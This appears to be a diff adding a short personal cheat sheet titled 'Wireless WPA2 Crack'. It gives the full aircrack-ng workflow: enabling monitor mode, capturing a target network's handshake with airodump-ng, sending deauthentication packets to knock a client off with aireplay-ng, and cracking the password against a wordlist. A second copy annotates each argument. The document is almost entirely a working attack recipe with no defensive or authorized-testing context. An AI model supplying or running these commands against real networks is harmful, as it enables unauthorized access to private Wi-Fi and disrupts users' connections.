@@ -1,0 +1,31 @@
+Wireless WPA2 Crack
+
+service network-manager stop
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+airodump-ng --bssid 00:00:00:00:00 --channel 1 --write test-handshake wlan0mon
+aireplay-ng --deauth 4 -a 00:00:00:00:00 -c 00:00:00:00:00 wlan0mon
+
+"new window"
+aircrack-ng test-handshake-01.cap -w /media/root/Mech500/Wordlists/english.txt
+
+
+
+
+
+
+
+
+
+
+		"target bssid"     "target channel" "filename to write"
+airodump-ng --bssid 00:00:00:00:00 -channel 1 --write test-handshake wlan0mon
+
+                          "target AP"        "client"
+aireplay-ng --deauth 4 -a 00:00:00:00:00 -c 00:00:00:00:00 wlan0mon
+
+               "filename"                        "path of wordlist"
+aircrack-ng test-handshake-01.cap -w /media/root/Mech500/Wordlists/english.txt
+
+
